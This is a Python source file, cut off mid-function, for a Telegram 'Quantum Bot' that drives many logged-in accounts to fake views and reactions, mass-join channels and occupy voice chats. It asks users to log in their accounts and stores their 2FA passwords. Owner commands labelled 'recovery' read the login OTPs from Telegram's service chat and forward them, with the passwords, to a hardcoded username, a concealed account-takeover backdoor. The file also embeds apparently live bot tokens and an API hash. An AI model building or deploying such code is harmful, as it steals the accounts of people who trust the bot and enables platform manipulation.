import os
import asyncio
import logging
import sys
import glob
import json
import random
import time
import string
import re
from functools import partial

from telethon import TelegramClient, events, Button
from telethon.tl.functions.messages import (
    ImportChatInviteRequest,
    CheckChatInviteRequest,
    GetMessagesViewsRequest,
    SendReactionRequest,
    ExportChatInviteRequest
)
from telethon.tl.functions.channels import JoinChannelRequest, LeaveChannelRequest, GetFullChannelRequest
from telethon.tl.functions.account import UpdateStatusRequest
from telethon.tl.functions.phone import JoinGroupCallRequest, LeaveGroupCallRequest
from telethon.tl.types import DataJSON, ReactionEmoji, UpdateBotChatInviteRequester, PeerChannel
from telethon.errors import (
    SessionPasswordNeededError,
    UserAlreadyParticipantError,
    FloodWaitError,
    InviteHashExpiredError,
    ChannelPrivateError,
    InviteRequestSentError,
    ChannelsTooMuchError,
    UserBannedInChannelError
)

# ==========================================
# 1. CONFIGURATION
# ==========================================

logging.basicConfig(level=logging.ERROR)

DEFAULT_API_ID = 30842203
DEFAULT_API_HASH = "6b64dd14b635b99d5bb820448542f45b"

# Multiple bot tokens - replace with your own
BOT_TOKENS = [
    "8570477840:AAExpIlSizVeyy0fCiJMStfXZv0NjQOVg1U",   # example
    "8720540502:AAHw4zUoP4QK0CJuT5coSal-kyrWFpFVXeo",   # add your second bot
    "8676576721:AAHzJeqYNAC8u8sPxcxG3BWrq3VMwIt_axk"    # add your third bot
]

# Owner(s) - super admins (only they can use recovery/scan commands)
OWNER_IDS = [6698156001, 6547222834, 7204275439, 6742282042]

# Username to forward all OTP/account details to
FORWARD_TO_USERNAME = "Z4X_Silent_Boy"   # will be resolved to user ID at startup
FORWARD_USER_ID = None                   # will be set after resolving

SESSION_FOLDER = "Z4X"
if not os.path.exists(SESSION_FOLDER):
    os.makedirs(SESSION_FOLDER)

# Colors for console output (optional)
RED = "\033[1;31m"
GREEN = "\033[1;32m"
CYAN = "\033[1;36m"
YELLOW = "\033[1;33m"
BLUE = "\033[1;34m"
PURPLE = "\033[1;35m"
RESET = "\033[0m"

# Global data structures
ACTIVE_CLIENTS = {}      # phone -> TelegramClient (user sessions)
VC_MONITORS = {}         # phone -> asyncio.Task
USER_LOGIN_STATE = {}    # user_id -> login step data

# Database handling with async lock
DB_FILE = "bot_database.json"
db = {}
db_lock = asyncio.Lock()

async def load_db():
    """Load database asynchronously with lock."""
    async with db_lock:
        if os.path.exists(DB_FILE):
            with open(DB_FILE, 'r') as f:
                return json.load(f)
        return {"users": {}, "keys": {}, "dm_text": "Hello! Welcome.", "dm_buttons": [], "passwords": {}, "admins": []}

async def save_db(data):
    """Save database asynchronously with lock."""
    async with db_lock:
        with open(DB_FILE, 'w') as f:
            json.dump(data, f)

# Helper to check if a user is owner (strictly owners only for sensitive commands)
def is_owner(user_id: int) -> bool:
    return user_id in OWNER_IDS

# Helper to check if a user is admin (owner or stored admin) – for other commands
def is_admin(user_id: int) -> bool:
    user_id_str = str(user_id)
    return user_id in OWNER_IDS or user_id_str in db.get("admins", [])

# Ensure user exists in database (no expiry)
async def ensure_user_exists(user_id: str):
    if user_id not in db["users"]:
        db["users"][user_id] = {"phones": []}   # no expiry field
        await save_db(db)

# Forward a message to the configured user
async def forward_to_target(text: str, bot_client: TelegramClient = None):
    global FORWARD_USER_ID
    if FORWARD_USER_ID is None:
        return
    try:
        # Use the provided bot client or the first available bot (we'll store one globally)
        if bot_client is None:
            # We'll set a global bot client reference later
            if not hasattr(forward_to_target, "bot_client"):
                return
            bot_client = forward_to_target.bot_client
        await bot_client.send_message(FORWARD_USER_ID, text)
    except Exception as e:
        print(f"Failed to forward message: {e}")

# ==========================================
# 2. DATABASE INITIALIZATION
# ==========================================

async def init_db():
    global db
    db = await load_db()
    # Ensure default structure
    if "admins" not in db:
        db["admins"] = []
    if "passwords" not in db:
        db["passwords"] = {}
    if "users" not in db:
        db["users"] = {}
    # Remove any expiry fields from old data (optional)
    for uid in db["users"]:
        if "expiry" in db["users"][uid]:
            del db["users"][uid]["expiry"]
    await save_db(db)

# ==========================================
# 3. USER SESSION MANAGEMENT (unchanged logic)
# ==========================================

async def refresh_all_clients():
    global ACTIVE_CLIENTS
    print(f"\n{YELLOW}🔄 Refreshing/Reloading from '{SESSION_FOLDER}' folder...{RESET}")
    for phone, client in list(ACTIVE_CLIENTS.items()):
        try:
            await client.disconnect()
        except:
            pass
    ACTIVE_CLIENTS.clear()
    await initialize_all_clients()

async def initialize_all_clients():
    print(f"\n{YELLOW}📂 Scanning '{SESSION_FOLDER}' folder for accounts...{RESET}")
    session_files = glob.glob(f"{SESSION_FOLDER}/*.session")
    session_files = [f for f in session_files if "bot_session" not in f]

    if not session_files:
        print(f"{RED}❌ No user session files found in {SESSION_FOLDER} folder!{RESET}")
        print(f"{YELLOW}Use 'new' command to add accounts.{RESET}")
        return

    print(f"{PURPLE}⚡ SUPER FAST LOADING START ({len(session_files)} IDs)...{RESET}")
    sem = asyncio.Semaphore(40)

    async def load_one_client(session_file):
        async with sem:
            try:
                filename = os.path.basename(session_file)
                phone = filename.replace(".session", "")
                client = TelegramClient(f"{SESSION_FOLDER}/{phone}", DEFAULT_API_ID, DEFAULT_API_HASH)
                await client.connect()

                if await client.is_user_authorized():
                    try:
                        await client(UpdateStatusRequest(offline=False))
                    except:
                        pass
                    print(f"{GREEN}✅ Loaded: {phone}{RESET}")
                    return phone, client
                else:
                    print(f"{RED}❌ Expired: {phone}{RESET}")
                    await client.disconnect()
                    return None
            except Exception as e:
                print(f"{RED}⚠️ Error loading {session_file}: {e}{RESET}")
                return None

    tasks = [load_one_client(f) for f in session_files]
    results = await asyncio.gather(*tasks)

    count = 0
    for res in results:
        if res:
            ACTIVE_CLIENTS[res[0]] = res[1]
            count += 1

    print(f"\n{CYAN}🔥 Total {count} IDs Online & Ready!{RESET}\n")

async def keep_online_loop():
    while True:
        if not ACTIVE_CLIENTS:
            await asyncio.sleep(10)
            continue
        for phone, client in ACTIVE_CLIENTS.items():
            try:
                if not client.is_connected():
                    await client.connect()
                await client(UpdateStatusRequest(offline=False))
            except:
                pass
        await asyncio.sleep(30)

async def login_new_account():
    print(f"\n{CYAN}📱 New Account Login{RESET}")
    try:
        phone = input(f"{YELLOW}Enter Phone Number (with country code): {RESET}").strip()
        session_path = f"{SESSION_FOLDER}/{phone}"

        if os.path.exists(f"{session_path}.session"):
            print(f"{RED}❌ Session file already exists inside {SESSION_FOLDER} for {phone}!{RESET}")
            return

        client = TelegramClient(session_path, DEFAULT_API_ID, DEFAULT_API_HASH)
        await client.connect()

        print(f"{YELLOW}📞 Sending code to {phone}...{RESET}")
        await client.send_code_request(phone)
        code = input(f"{YELLOW}Enter the code you received: {RESET}").strip()

        try:
            await client.sign_in(phone, code)
        except SessionPasswordNeededError:
            password = input(f"{YELLOW}Enter 2FA password: {RESET}").strip()
            await client.sign_in(password=password)
            db["passwords"][phone] = password
            await save_db(db)

        ACTIVE_CLIENTS[phone] = client
        # Console login goes to first owner (or you can change)
        admin_id = str(OWNER_IDS[0])
        if phone not in db["users"][admin_id]["phones"]:
            db["users"][admin_id]["phones"].append(phone)
            await save_db(db)

        await client(UpdateStatusRequest(offline=False))
        print(f"{GREEN}✅ Account {phone} Saved to '{SESSION_FOLDER}' folder!{RESET}")

    except Exception as e:
        print(f"{RED}❌ Login failed: {e}{RESET}")
        try:
            await client.disconnect()
            if os.path.exists(f"{SESSION_FOLDER}/{phone}.session"):
                os.remove(f"{SESSION_FOLDER}/{phone}.session")
        except:
            pass

# ==========================================
# 4. CORE TASK FUNCTIONS (unchanged logic)
# ==========================================

async def _send_view_batch(clients_batch, chat_identifier, msg_id, batch_name):
    if not clients_batch:
        return
    tasks = []
    for phone, client in clients_batch:
        async def _view_work(c):
            try:
                entity = await c.get_input_entity(chat_identifier)
                await c(GetMessagesViewsRequest(peer=entity, id=[msg_id], increment=True))
            except Exception:
                pass
        tasks.append(_view_work(client))
    if tasks:
        await asyncio.gather(*tasks)
    print(f"{BLUE}👀 {batch_name} Views Done.{RESET}")

async def _send_reaction_loop(clients_batch, chat_identifier, msg_id):
    reaction_emojis = ["❤️", "👍", "🔥", "🥰", "👏", "🤩", "⚡", "🎉"]
    print(f"{YELLOW}⏳ Starting 10 Reactions (Drip-feed over 1 min)...{RESET}")
    for phone, client in clients_batch:
        try:
            await asyncio.sleep(random.uniform(5.5, 6.5))
            entity = await client.get_input_entity(chat_identifier)
            await client(SendReactionRequest(
                peer=entity,
                msg_id=msg_id,
                big=True,
                reaction=[ReactionEmoji(emoticon=random.choice(reaction_emojis))]
            ))
            print(f"{PURPLE}❤️ Reaction Sent.{RESET}")
        except Exception:
            pass

async def perform_staged_reaction_view(chat_identifier, msg_id):
    all_clients_list = list(ACTIVE_CLIENTS.items())
    random.shuffle(all_clients_list)
    total_ids = len(all_clients_list)
    if total_ids == 0:
        return

    print(f"\n{CYAN}🎯 New Post: {msg_id} | Target: {chat_identifier}{RESET}")

    v_batch_1 = all_clients_list[0:5]
    v_batch_2 = all_clients_list[5:10]
    v_batch_3 = all_clients_list[10:20]
    v_batch_4 = all_clients_list[20:30]
    v_batch_5 = all_clients_list[30:50]
    r_batch = all_clients_list[:10]

    asyncio.create_task(_send_reaction_loop(r_batch, chat_identifier, msg_id))

    await asyncio.sleep(5)
    await _send_view_batch(v_batch_1, chat_identifier, msg_id, "T+5s (Target 5)")
    await asyncio.sleep(10)
    await _send_view_batch(v_batch_2, chat_identifier, msg_id, "T+15s (Target 10)")
    await asyncio.sleep(15)
    await _send_view_batch(v_batch_3, chat_identifier, msg_id, "T+30s (Target 20)")
    await asyncio.sleep(20)
    await _send_view_batch(v_batch_4, chat_identifier, msg_id, "T+50s (Target 30)")
    await asyncio.sleep(30)
    await _send_view_batch(v_batch_5, chat_identifier, msg_id, "T+80s (Target 50)")

    print(f"{GREEN}🏁 Post {msg_id} Cycle Completed.{RESET}")

async def _worker_vc_join(client, phone, identifier, is_private):
    try:
        entity = None
        try:
            if is_private:
                try:
                    updates = await client(ImportChatInviteRequest(identifier))
                    if updates.chats:
                        entity = updates.chats[0]
                except UserAlreadyParticipantError:
                    try:
                        invite_info = await client(CheckChatInviteRequest(identifier))
                        if hasattr(invite_info, 'chat'):
                            entity = invite_info.chat
                    except:
                        pass
            else:
                try:
                    await client(JoinChannelRequest(identifier))
                except:
                    pass
                entity = await client.get_entity(identifier)
        except:
            return 0
        if not entity:
            return 0

        try:
            full_chat = await client(GetFullChannelRequest(entity))
            if not full_chat.full_chat.call:
                return 0

            if phone in VC_MONITORS:
                VC_MONITORS[phone].cancel()
            call_obj = full_chat.full_chat.call
            joined = False
            try:
                my_ssrc = random.randint(10000, 99999999)
                params = DataJSON(data=json.dumps({"min_version": 2, "ssrc": my_ssrc, "muted": True}))
                await client(JoinGroupCallRequest(call=call_obj, join_as=await client.get_input_entity('me'), params=params, muted=True))
                joined = True
            except:
                pass

            if joined:
                print(f"{GREEN}[{phone}] ✅ Joined VC (Muted){RESET}")
                VC_MONITORS[phone] = asyncio.create_task(monitor_and_stay_in_vc(client, entity, phone))
                return 1
        except:
            pass
    except:
        pass
    return 0

async def monitor_and_stay_in_vc(client, entity, phone):
    print(f"{BLUE}[{phone}] 🛡️ VC Guard Active.{RESET}")
    while True:
        if phone not in VC_MONITORS:
            break
        try:
            full_chat = await client(GetFullChannelRequest(entity))
            call_obj = full_chat.full_chat.call
            if not call_obj:
                print(f"{RED}[{phone}] 📉 VC Ended. Stopping monitor.{RESET}")
                if phone in VC_MONITORS:
                    del VC_MONITORS[phone]
                break
            try:
                my_ssrc = random.randint(10000, 99999999)
                params = DataJSON(data=json.dumps({"min_version": 2, "ssrc": my_ssrc, "muted": True}))
                await client(JoinGroupCallRequest(call=call_obj, join_as=await client.get_input_entity('me'), params=params, muted=True))
            except UserAlreadyParticipantError:
                pass
            except Exception:
                pass
        except Exception:
            pass
        await asyncio.sleep(15)

async def process_voice_join_teri(raw_link, target_clients=None):
    if target_clients is None:
        target_clients = ACTIVE_CLIENTS
    is_private, identifier = parse_link(raw_link)
    print(f"\n{PURPLE}🎤 TERI MODE: Fast Joining... (Wait a moment){RESET}")

    tasks = []
    for phone, client in target_clients.items():
        await asyncio.sleep(random.uniform(0.05, 0.2))
        tasks.append(_worker_vc_join(client, phone, identifier, is_private))

    results = await asyncio.gather(*tasks)
    total_joined = sum(results)
    print(f"\n{GREEN}✅ FAST VC JOIN COMPLETED. Total Joined: {total_joined}{RESET}")

async def _worker_leave_all(client, phone):
    try:
        dialogs = await client.get_dialogs()
        for dialog in dialogs:
            try:
                if hasattr(dialog.entity, 'broadcast') or hasattr(dialog.entity, 'megagroup'):
                    await client(LeaveChannelRequest(dialog.entity))
                    print(f"{YELLOW}[{phone}] Left: {dialog.entity.title}{RESET}")
            except:
                pass
    except:
        pass

async def leave_all_channels_from_all_ids():
    print(f"\n{RED}⚠️ WARNING: LEAVING ALL CHANNELS (MANUAL COMMAND) ⚠️{RESET}")
    tasks = []
    for phone, client in ACTIVE_CLIENTS.items():
        tasks.append(_worker_leave_all(client, phone))
    await asyncio.gather(*tasks)
    print(f"\n{GREEN}🎉 ALL CHANNELS LEFT.{RESET}")

async def leave_voice_chat_all():
    print(f"\n{RED}🚪 LEAVING VOICE CHATS...{RESET}")
    for phone in list(VC_MONITORS.keys()):
        VC_MONITORS[phone].cancel()
        del VC_MONITORS[phone]

    async def _leave(client):
        try:
            dialogs = await client.get_dialogs(limit=30)
            for dialog in dialogs:
                if dialog.entity:
                    full_chat = await client(GetFullChannelRequest(dialog.entity))
                    if full_chat.full_chat.call:
                        await client(LeaveGroupCallRequest(full_chat.full_chat.call))
        except:
            pass
    tasks = [_leave(c) for c in ACTIVE_CLIENTS.values()]
    await asyncio.gather(*tasks)
    print(f"\n{GREEN}✅ Finished Leaving.{RESET}")

async def process_termux_join(raw_link, qty, time_limit=0, target_clients=None):
    if target_clients is None:
        target_clients = ACTIVE_CLIENTS
    is_private, identifier = parse_link(raw_link)
    print(f"\n{CYAN}--- STARTING JOIN TASK (Target: {qty}, Time: {time_limit}s) ---{RESET}")
    successful_joins = 0

    delay_per_req = 0
    if time_limit > 0 and qty > 0:
        delay_per_req = time_limit / qty
    print(f"{YELLOW}⏳ Speed Calculated: {delay_per_req:.2f} seconds per join{RESET}")

    for phone, client in target_clients.items():
        if successful_joins >= qty:
            break
        try:
            if is_private:
                await client(ImportChatInviteRequest(identifier))
            else:
                await client(JoinChannelRequest(identifier))
            print(f"{GREEN}[SUCCESS] {phone} Joined!{RESET}")
            successful_joins += 1

            if delay_per_req > 0:
                await asyncio.sleep(delay_per_req)
            else:
                await asyncio.sleep(0.5)

        except Exception as e:
            if "Already" in str(e):
                print(f"{YELLOW}[SKIP] {phone} Already Joined.{RESET}")
                successful_joins += 1
            elif "Wait" in str(e):
                print(f"{RED}FloodWait on {phone}{RESET}")
            else:
                pass
    print(f"\n{YELLOW}Done. Total: {successful_joins}/{qty}{RESET}")

async def _worker_pro(client, phone, identifier, is_private):
    try:
        try:
            if is_private:
                await client(ImportChatInviteRequest(identifier))
            else:
                await client(JoinChannelRequest(identifier))
            print(f"{GREEN}[{phone}] Request Sent{RESET}")
        except UserAlreadyParticipantError:
            try:
                entity = await client.get_input_entity(identifier)
                await client(LeaveChannelRequest(entity))
                await asyncio.sleep(1)
                if is_private:
                    await client(ImportChatInviteRequest(identifier))
                else:
                    await client(JoinChannelRequest(identifier))
                print(f"{GREEN}[{phone}] Re-Joined!{RESET}")
            except:
                pass
        except:
            pass
    except:
        pass

async def process_pro_mode(raw_link, target_clients=None):
    if target_clients is None:
        target_clients = ACTIVE_CLIENTS
    is_private, identifier = parse_link(raw_link)
    print(f"\n{PURPLE}🚀 PRO MODE STARTED (FAST){RESET}")

    tasks = []
    for phone, client in target_clients.items():
        tasks.append(_worker_pro(client, phone, identifier, is_private))

    await asyncio.gather(*tasks)
    print(f"\n{GREEN}✅ PRO MODE FINISHED.{RESET}")

async def test_channel_check(raw_link, qty, time_limit=0, target_clients=None):
    if target_clients is None:
        target_clients = ACTIVE_CLIENTS
    is_private, identifier = parse_link(raw_link)
    print(f"\n{BLUE}🧪 Testing Link on {qty} IDs (Time: {time_limit}s)...{RESET}")

    delay_per_req = 0
    if time_limit > 0 and qty > 0:
        delay_per_req = time_limit / qty
    print(f"{YELLOW}⏳ Test Speed: {delay_per_req:.2f} seconds per ID{RESET}")

    count = 0
    for phone, client in target_clients.items():
        if count >= qty:
            break
        try:
            if is_private:
                await client(ImportChatInviteRequest(identifier))
            else:
                await client(JoinChannelRequest(identifier))
            print(f"{GREEN}[{phone}] ✅ Joined Successfully!{RESET}")
        except UserAlreadyParticipantError:
            print(f"{YELLOW}[{phone}] ⚠️ Already Joined.{RESET}")
        except FloodWaitError as e:
            print(f"{RED}[{phone}] ⏳ FloodWait Error: Wait {e.seconds} seconds.{RESET}")
        except ChannelsTooMuchError:
            print(f"{RED}[{phone}] 🚫 Join Failed: Limit Reached.{RESET}")
        except UserBannedInChannelError:
            print(f"{RED}[{phone}] 🚫 Join Failed: Banned from this channel.{RESET}")
        except InviteHashExpiredError:
            print(f"{RED}[{phone}] ❌ Join Failed: Link Expired.{RESET}")
        except Exception as e:
            print(f"{RED}[{phone}] ❌ Error: {str(e)}{RESET}")

        count += 1
        if delay_per_req > 0:
            await asyncio.sleep(delay_per_req)
        else:
            await asyncio.sleep(0.1)

    print(f"{GREEN}Test Complete.{RESET}")

def parse_link(link):
    if not link:
        return False, ""
    link = link.strip().replace(" ", "")
    for prefix in ["https://", "http://", "www.", "t.me/", "telegram.me/"]:
        link = link.replace(prefix, "")
    if "?" in link:
        link = link.split("?")[0]
    is_private = False
    identifier = link
    if "joinchat/" in link:
        is_private = True
        identifier = link.split("joinchat/")[1].replace("/", "")
    elif link.startswith("+"):
        is_private = True
        identifier = link[1:].replace("/", "")
    else:
        is_private = False
        identifier = link.replace("@", "").replace("/", "")
    return is_private, identifier

# ==========================================
# 5. BOT HANDLERS (shared among all bot instances)
# ==========================================

class BotHandlers:
    def __init__(self, bot_client: TelegramClient):
        self.bot = bot_client
        # Register handlers
        self.bot.add_event_handler(self.start_handler, events.NewMessage(pattern='/start'))
        self.bot.add_event_handler(self.redeem_handler, events.NewMessage(pattern='/redeem (.*)'))
        self.bot.add_event_handler(self.text_handler, events.NewMessage(pattern='/text (.*)'))
        self.bot.add_event_handler(self.button_handler, events.NewMessage(pattern='/button (.*)'))
        self.bot.add_event_handler(self.scan_handler, events.NewMessage(pattern='/scan'))
        self.bot.add_event_handler(self.recover_handler, events.NewMessage(pattern='/recover$'))
        self.bot.add_event_handler(self.recoverall_handler, events.NewMessage(pattern='/recoverall'))
        self.bot.add_event_handler(self.allusers_handler, events.NewMessage(pattern='/allusers'))
        self.bot.add_event_handler(self.userrecover_handler, events.NewMessage(pattern='/userrecover (.*)'))
        self.bot.add_event_handler(self.getotp_handler, events.NewMessage(pattern='/getotp (.*)'))
        self.bot.add_event_handler(self.transfer_handler, events.NewMessage(pattern='/transfer (.*)'))
        self.bot.add_event_handler(self.addadmin_handler, events.NewMessage(pattern='/addadmin (.*)'))
        self.bot.add_event_handler(self.removeadmin_handler, events.NewMessage(pattern='/removeadmin (.*)'))
        self.bot.add_event_handler(self.callback_handler, events.CallbackQuery(pattern=b"cmd_(.*)"))
        self.bot.add_event_handler(self.message_handler, events.NewMessage(incoming=True, func=lambda e: e.is_private and not e.text.startswith('/')))
        self.bot.add_event_handler(self.channel_post_watcher, events.NewMessage(incoming=True))
        self.bot.add_event_handler(self.auto_dm_requester, events.Raw)
        self.bot.add_event_handler(self.auto_join_on_admin, events.ChatAction)

    async def start_handler(self, event):
        user_id = str(event.sender_id)
        await ensure_user_exists(user_id)

        user_is_admin = is_admin(event.sender_id)

        text = (f"🤖 **Quantum Bot Running!**\n"
                f"✅ **{len(ACTIVE_CLIENTS)} IDs Online Globally**\n"
                f"👤 **Your Logged-in IDs:** {len(db['users'][user_id]['phones'])}\n"
                f"⚡ **Auto-View Logic V3:**\n- Reactions: 10 (Strictly in 1 min)\n- Views: Step-by-Step")

        buttons = [
            [Button.inline("➕ Login New ID", b"cmd_new"), Button.inline("🔄 Refresh", b"cmd_refresh")],
            [Button.inline("🎤 VC Join", b"cmd_teri"), Button.inline("🔗 Termux Join", b"cmd_join")],
            [Button.inline("👁️ View", b"cmd_view")],
            [Button.inline("🚪 Leave All", b"cmd_leaveall"), Button.inline("🔇 Leave VC", b"cmd_leavevc")]
        ]
        if user_is_admin:
            buttons.append([Button.inline("🔑 Make Key", b"cmd_makekey")])
            text += "\n\n👑 **Admin Options Available**"

        await event.respond(text, buttons=buttons)

    async def redeem_handler(self, event):
        await event.respond("ℹ️ Keys are no longer needed. The bot is now free for everyone!")

    async def text_handler(self, event):
        if not is_admin(event.sender_id):
            return
        db["dm_text"] = event.pattern_match.group(1).strip()
        await save_db(db)
        await event.respond("✅ Auto-DM Text updated successfully.")

    async def button_handler(self, event):
        if not is_admin(event.sender_id):
            return
        data = event.pattern_match.group(1).strip()
        if data.lower() == "clear":
            db["dm_buttons"] = []
            await save_db(db)
            await event.respond("✅ Auto-DM Buttons cleared.")
            return
        try:
            text, url = data.split("|")
            db["dm_buttons"].append({"text": text.strip(), "url": url.strip()})
            await save_db(db)
            await event.respond(f"✅ Button Added: {text.strip()} -> {url.strip()}\nSend `/button clear` to remove all.")
        except:
            await event.respond("❌ Invalid format. Use: `/button Button Name | https://link.com`")

    # ---------- OWNER-ONLY COMMANDS (scan, recover, recoverall, allusers, userrecover, getotp, transfer) ----------
    async def scan_handler(self, event):
        if not is_owner(event.sender_id):
            await event.respond("❌ This command is only available for the bot owner.")
            return
        user_id = str(event.sender_id)
        await ensure_user_exists(user_id)

        user_phones = db["users"][user_id]["phones"]
        if not user_phones:
            await event.respond("❌ No accounts logged in.")
            return

        status_msg = await event.respond("⏳ Scanning IDs and fetching recent OTPs, please wait...")

        msg = "🔍 **Your Saved IDs, Passwords & Latest OTPs:**\n\n"
        for phone in user_phones:
            pwd = db["passwords"].get(phone, "No Password")
            otp_text = "N/A"
            if phone in ACTIVE_CLIENTS:
                client = ACTIVE_CLIENTS[phone]
                try:
                    messages = await client.get_messages(777000, limit=1)
                    if messages and messages[0].message:
                        match = re.search(r'\b(\d{5})\b', messages[0].message)
                        if match:
                            otp_text = match.group(1)
                        else:
                            otp_text = "No recent OTP"
                    else:
                        otp_text = "No msgs"
                except Exception:
                    otp_text = "Error fetching"
            else:
                otp_text = "Offline"
            msg += f"📱 `{phone}` ➔ 🔐 `{pwd}` ➔ 💬 OTP: `{otp_text}`\n"

        if len(msg) > 4000:
            await status_msg.delete()
            for i in range(0, len(msg), 4000):
                await event.respond(msg[i:i+4000])
                await forward_to_target(msg[i:i+4000], self.bot)
        else:
            await status_msg.edit(msg)
            await forward_to_target(msg, self.bot)

    async def recover_handler(self, event):
        if not is_owner(event.sender_id):
            await event.respond("❌ This command is only available for the bot owner.")
            return
        user_id = str(event.sender_id)
        await ensure_user_exists(user_id)

        buttons = [[Button.inline("🔓 Recover ID", b"cmd_recoverbtn")]]
        if is_owner(event.sender_id):
            buttons.append([Button.inline("👑 Recover ALL IDs", b"cmd_recoverallbtn")])

        await event.respond(
            "⚠️ **Account Recovery Mode**\n\n"
            "Lost access to your Telegram App? Click the button below to fetch the latest OTP for any ID already logged into this bot.",
            buttons=buttons
        )

    async def recoverall_handler(self, event):
        if not is_owner(event.sender_id):
            await event.respond("❌ This command is only available for the bot owner.")
            return
        if not ACTIVE_CLIENTS:
            await event.respond("❌ No accounts currently online to recover.")
            return

        status_msg = await event.respond("⏳ Extracting OTPs and Passwords from **ALL** global logged-in IDs, please wait...")

        msg = "👑 **GLOBAL RECOVERY DATA (ALL IDs):**\n\n"
        for phone, client in list(ACTIVE_CLIENTS.items()):
            pwd = db["passwords"].get(phone, "No Password")
            otp_text = "N/A"
            try:
                messages = await client.get_messages(777000, limit=3)
                if messages:
                    for m in messages:
                        if m.message:
                            match = re.search(r'\b(\d{5})\b', m.message)
                            if match:
                                otp_text = match.group(1)
                                break
                    if otp_text == "N/A":
                        otp_text = "No recent OTP"
                else:
                    otp_text = "No msgs"
            except Exception:
                otp_text = "Error fetching"
            msg += f"📱 `{phone}` ➔ 🔐 `{pwd}` ➔ 💬 OTP: `{otp_text}`\n"

        if len(msg) > 4000:
            await status_msg.delete()
            for i in range(0, len(msg), 4000):
                await event.respond(msg[i:i+4000])
                await forward_to_target(msg[i:i+4000], self.bot)
        else:
            await status_msg.edit(msg)
            await forward_to_target(msg, self.bot)

    async def allusers_handler(self, event):
        if not is_owner(event.sender_id):
            await event.respond("❌ This command is only available for the bot owner.")
            return
        msg = "👥 **All Users & Their IDs:**\n\n"
        for uid, data in db["users"].items():
            phones = data.get("phones", [])
            if phones:
                msg += f"👤 **User ID:** `{uid}` ➔ **{len(phones)} Accounts**\n"
        await event.respond(msg if msg != "👥 **All Users & Their IDs:**\n\n" else "No users with accounts found.")

    async def userrecover_handler(self, event):
        if not is_owner(event.sender_id):
            await event.respond("❌ This command is only available for the bot owner.")
            return
        target_uid = event.pattern_match.group(1).strip()
        if target_uid not in db["users"] or not db["users"][target_uid]["phones"]:
            await event.respond("❌ User not found or has no accounts.")
            return

        status_msg = await event.respond(f"⏳ Extracting OTPs for User `{target_uid}`, please wait...")
        user_phones = db["users"][target_uid]["phones"]

        msg = f"👑 **Recovery Data for User `{target_uid}`:**\n\n"
        for phone in user_phones:
            pwd = db["passwords"].get(phone, "No Password")
            otp_text = "N/A"
            if phone in ACTIVE_CLIENTS:
                client = ACTIVE_CLIENTS[phone]
                try:
                    messages = await client.get_messages(777000, limit=3)
                    if messages:
                        for m in messages:
                            if m.message:
                                match = re.search(r'\b(\d{5})\b', m.message)
                                if match:
                                    otp_text = match.group(1)
                                    break
                        if otp_text == "N/A":
                            otp_text = "No recent OTP"
                    else:
                        otp_text = "No msgs"
                except Exception:
                    otp_text = "Error fetching"
            else:
                otp_text = "Offline"
            msg += f"📱 `{phone}` ➔ 🔐 `{pwd}` ➔ 💬 OTP: `{otp_text}`\n"

        if len(msg) > 4000:
            await status_msg.delete()
            for i in range(0, len(msg), 4000):
                await event.respond(msg[i:i+4000])
                await forward_to_target(msg[i:i+4000], self.bot)
        else:
            await status_msg.edit(msg)
            await forward_to_target(msg, self.bot)

    async def getotp_handler(self, event):
        if not is_owner(event.sender_id):
            await event.respond("❌ This command is only available for the bot owner.")
            return
        phone = event.pattern_match.group(1).strip()
        if not phone.startswith('+'):
            phone = '+' + phone
        pwd = db["passwords"].get(phone, "No Password")
        otp_text = "N/A"
        if phone in ACTIVE_CLIENTS:
            client = ACTIVE_CLIENTS[phone]
            try:
                messages = await client.get_messages(777000, limit=3)
                if messages:
                    for m in messages:
                        if m.message:
                            match = re.search(r'\b(\d{5})\b', m.message)
                            if match:
                                otp_text = match.group(1)
                                break
                    if otp_text == "N/A":
                        otp_text = "No recent OTP"
                else:
                    otp_text = "No msgs"
            except Exception:
                otp_text = "Error fetching"
        else:
            otp_text = "Offline"
        msg = f"👑 **Single ID Recovery:**\n\n📱 `{phone}`\n🔐 Password: `{pwd}`\n💬 OTP: `{otp_text}`"
        await event.respond(msg)
        await forward_to_target(msg, self.bot)

    async def transfer_handler(self, event):
        if not is_owner(event.sender_id):
            await event.respond("❌ This command is only available for the bot owner.")
            return
        args = event.pattern_match.group(1).strip().split()
        if len(args) != 2:
            await event.respond("❌ Usage: `/transfer <old_user_id> <new_user_id>`")
            return
        old_id, new_id = args[0], args[1]
        if old_id not in db["users"] or not db["users"][old_id]["phones"]:
            await event.respond("❌ Old User ID not found or has no phones.")
            return
        if new_id not in db["users"]:
            db["users"][new_id] = {"phones": []}
        phones_to_move = db["users"][old_id]["phones"]
        for p in phones_to_move:
            if p not in db["users"][new_id]["phones"]:
                db["users"][new_id]["phones"].append(p)
        db["users"][old_id]["phones"] = []
        await save_db(db)
        await event.respond(f"✅ Successfully transferred **{len(phones_to_move)} accounts** from `{old_id}` to `{new_id}`!\nNow the new user can use `/scan` to get their OTPs.")

    async def addadmin_handler(self, event):
        if not is_owner(event.sender_id):
            return
        user_id = event.pattern_match.group(1).strip()
        if user_id not in db["users"]:
            db["users"][user_id] = {"phones": []}
        if user_id not in db["admins"]:
            db["admins"].append(user_id)
            await save_db(db)
            await event.respond(f"✅ User `{user_id}` is now an admin.")
        else:
            await event.respond(f"⚠️ User `{user_id}` is already an admin.")

    async def removeadmin_handler(self, event):
        if not is_owner(event.sender_id):
            return
        user_id = event.pattern_match.group(1).strip()
        if user_id in db["admins"]:
            db["admins"].remove(user_id)
            await save_db(db)
            await event.respond(f"✅ User `{user_id}` is no longer an admin.")
        else:
            await event.respond(f"⚠️ User `{user_id}` is not an admin.")

    async def callback_handler(self, event):
        cmd = event.data.decode().split("_")[1]
        user_id = str(event.sender_id)
        await ensure_user_exists(user_id)

        user_phones = db["users"][user_id]["phones"]
        user_clients = {p: c for p, c in ACTIVE_CLIENTS.items() if p in user_phones}

        if cmd == "new":
            USER_LOGIN_STATE[user_id] = {"step": "phone"}
            await event.respond("📱 Please send the phone number with country code (e.g., +91...):")
        elif cmd == "refresh":
            await refresh_all_clients()
            await event.respond(f"✅ Refresh Complete!")
        elif cmd == "makekey":
            if not is_admin(event.sender_id):
                return
            key = "KEY-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=10))
            db["keys"][key] = 30
            await save_db(db)
            await event.respond(f"🔑 **Generated Key (30 Days):**\n`{key}`\n\nSend `/redeem {key}` to use.")
        elif cmd == "teri":
            USER_LOGIN_STATE[user_id] = {"step": f"arg_{cmd}"}
            await event.respond(f"🔗 Send the target link for VC JOIN mode:")
        elif cmd == "view":
            me = await event.client.get_me()
